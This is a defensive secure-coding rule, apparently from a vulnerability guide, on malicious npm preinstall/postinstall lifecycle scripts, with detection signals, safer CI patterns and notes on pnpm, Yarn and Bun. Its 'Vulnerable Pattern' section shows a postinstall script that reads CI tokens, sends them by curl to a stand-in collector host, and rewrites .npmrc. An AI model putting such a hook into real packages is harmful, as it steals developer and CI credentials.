---
id: WOF-SUPPLY-001
title: "Malicious npm Lifecycle Script"
kind: vulnerability
default_severity: high
exploitability: medium
standards:
  cwe:
    - CWE-829
  owasp_top_10:
    - id: "A03:2025 Software Supply Chain Failures"
      relationship: related
platforms:
  - ci-cd
  - desktop
  - server
languages:
  - json
  - javascript
  - shell
detection:
  type: semantic-pattern
  methods:
    - grep
    - ast
    - semantic-review
  candidate_tokens:
    - preinstall
    - postinstall
    - npm_package_dev
    - package-lock.json
indicators:
  - dependency manifests or lockfile diffs that introduce a package with `preinstall`, `install`, or `postinstall` scripts
  - install-time script bodies that spawn shells, execute downloaded code, read environment secrets, or rewrite auth/config files
  - new devDependencies or transitive dependencies whose lifecycle hooks run in developer workstations or CI jobs
  - lockfile changes that switch package versions, tarball sources, or integrity values immediately before a lifecycle script appears
tags:
  - supply-chain
  - npm
  - dependency
  - lifecycle-script
  - ci-cd
---

## Rule

Treat dependency lifecycle hooks as arbitrary code execution.
Do not allow newly introduced npm dependencies to run unreviewed `preinstall`, `install`, or `postinstall` scripts during `npm install` or `npm ci`, including when the package is only a `devDependency`.

## Mental Model

```text
dependency diff
      ↓
npm install or npm ci
      ↓
dependency lifecycle script
      ↓
developer or CI privileges
      ↓
arbitrary code execution or secret theft
```

The dependency is not "just metadata."
If npm executes an install-time hook, the package gains the filesystem, network, and environment access of the machine running the install.

## Why This Matters

Install hooks run before the project has built or tested anything.
A malicious dependency can steal npm tokens, GitHub credentials, cloud secrets, SSH material, or tamper with generated artifacts during installation.
This remains dangerous for `devDependencies`, because developer workstations and CI jobs usually install them before linting, testing, or releasing code.

## Vulnerable Pattern

```diff
{
  "name": "storefront",
  "private": true,
  "devDependencies": {
+   "@acme/build-helper": "2.4.1"
  }
}
```

```json
{
  "name": "@acme/build-helper",
  "version": "2.4.1",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
```

```js
import { execFileSync } from "node:child_process";
import { writeFileSync } from "node:fs";

const token =
  process.env.GITHUB_TOKEN ||
  process.env.NPM_TOKEN ||
  process.env.AWS_SESSION_TOKEN;

if (token) {
  execFileSync("curl", [
    "-fsS",
    "-X",
    "POST",
    "https://collector.example/install-hook",
    "--data-urlencode",
    `token=${token}`,
  ]);
}

writeFileSync(".npmrc", "//registry.npmjs.org/:_authToken=attacker-token\n");
```

## Example Attack

```text
$ npm ci
...
> @acme/build-helper@2.4.1 postinstall
> node postinstall.js
```

An attacker publishes or slips a compromised dependency version into a pull request.
When a developer or CI job installs dependencies, npm automatically executes the package's lifecycle script before the rest of the workflow trusts the workspace.

## Why The Attack Works

1. The project accepts a new dependency or lockfile update without fully reviewing install-time behavior.
2. npm automatically runs dependency `preinstall`, `install`, and `postinstall` hooks during `npm install` and `npm ci`.
3. The script runs with the filesystem, environment variables, and network access of the developer machine or CI runner.
4. `devDependencies` still execute in many lint, test, and release pipelines, so non-runtime tooling can reach privileged build environments.
5. The malicious hook steals secrets, tampers with build outputs, or establishes persistence before normal application code starts.

## Safer Pattern

Pin exact dependency versions, review both manifest and lockfile diffs, and prevent dependency lifecycle scripts from running automatically in secret-bearing jobs unless they are explicitly approved.

```diff
{
  "name": "storefront",
  "private": true,
  "devDependencies": {
+   "@acme/build-helper": "2.4.0"
  }
}
```

```yaml
steps:
  - name: Review dependency and lockfile changes
    run: git diff -- package.json package-lock.json

  - name: Install dependencies without automatic lifecycle hooks
    run: npm ci --ignore-scripts

  - name: Run only reviewed project commands
    run: npm run lint && npm test
```

If a trusted package genuinely requires install-time behavior, run that step explicitly in an isolated job after review, without deployment secrets or registry write credentials in the environment.

## Detection

Detection type: `semantic-pattern`.

- Candidate collection: inspect `package.json` and `package-lock.json` diffs for newly added or changed packages with `preinstall`, `install`, or `postinstall` scripts.
- Candidate collection: inspect dependency package manifests and extracted tarballs for install hooks that invoke shells, `node`, `curl`, `wget`, `powershell`, or similar command runners.
- Confirmation: verify that the lifecycle script executes automatically during `npm install` or `npm ci` and can perform a privileged effect such as command execution, secret access, network exfiltration, file tampering, or auth/config rewrites.
- High-confidence signals include new install hooks that read `GITHUB_TOKEN`, `NPM_TOKEN`, cloud credentials, SSH material, or that modify `.npmrc`, build outputs, or release artifacts.
- Treat `devDependencies` as in scope when developer workstations or CI jobs install them before running tests, builds, or release steps.
- A scanner should surface install hooks, dependency diffs, and lockfile source changes; the agent or reviewer should confirm whether the behavior is expected native build tooling or untrusted install-time code execution.

## False Positives

- Some legitimate packages use install hooks for native compilation or platform-specific setup, such as `node-gyp rebuild`; the presence of a lifecycle script alone is not proof of malicious behavior.
- A top-level project script that developers invoke manually is not the same issue as a dependency lifecycle hook that npm runs automatically during installation.
- Lockfile churn without a new or changed install hook, or a reviewed update from a trusted package with expected build behavior, is usually not this rule.

## Framework Notes

This guide focuses on npm semantics, but adjacent JavaScript package managers now expose more explicit controls for the same trust boundary.

- `pnpm` (v11/12) documents supply-chain protections that go beyond plain lockfiles: pnpm v10 disables automatic dependency `postinstall` execution, recommends explicit `allowBuilds` entries instead of `dangerouslyAllowAllBuilds`, and pnpm v11 defaults `minimumReleaseAge` to 1440 minutes, while also supporting `blockExoticSubdeps` and `trustPolicy`.
- Yarn Berry (Yarn 4) documents a default-off model for third-party install hooks: `enableScripts` defaults to `false`, so third-party `postinstall` scripts do not run during install, and `dependenciesMeta.built` can then deny or allow builds per package.
- Bun (Bun 1.x) documents a default-secure allowlist model: lifecycle scripts do not run arbitrarily, packages can be explicitly approved through `trustedDependencies`, blocked scripts can be reviewed with `bun pm untrusted`, and `--ignore-scripts` or `install.ignoreScripts = true` can disable all lifecycle scripts.

The core question remains the same across npm-compatible ecosystems: whether third-party code can execute during dependency installation before the project deliberately chooses to trust it.

## References

- [MITRE CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
- [OWASP Top 10 2025 A03: Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)
- [npm Docs: Scripts](https://docs.npmjs.com/cli/using-npm/scripts/)
- [npm Docs: package-lock.json](https://docs.npmjs.com/files/package-lock.json/)
- [pnpm v11/12 Docs: Mitigating supply chain attacks](https://pnpm.io/supply-chain-security)
- [Yarn 4+ Docs: Settings (.yarnrc.yml)](https://yarnpkg.com/configuration/yarnrc/)
- [Yarn 4+ Docs: Manifest (package.json)](https://yarnpkg.com/configuration/manifest/)
- [Bun 1.x Docs: Lifecycle scripts](https://bun.sh/docs/pm/lifecycle)
- [OWASP Cheat Sheet Series: Vulnerable Dependency Management](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html)

## Quick Checklist

- New dependencies and lockfile diffs are reviewed before merge.
- Dependency `preinstall`, `install`, and `postinstall` hooks are treated as arbitrary code execution.
- Secret-bearing CI jobs avoid automatic dependency lifecycle scripts unless the behavior is explicitly approved.
- `devDependencies` are reviewed with the same care as runtime dependencies when they install in developer or CI environments.
- Reviewers inspect changed package sources, versions, and integrity metadata when install-time hooks appear.
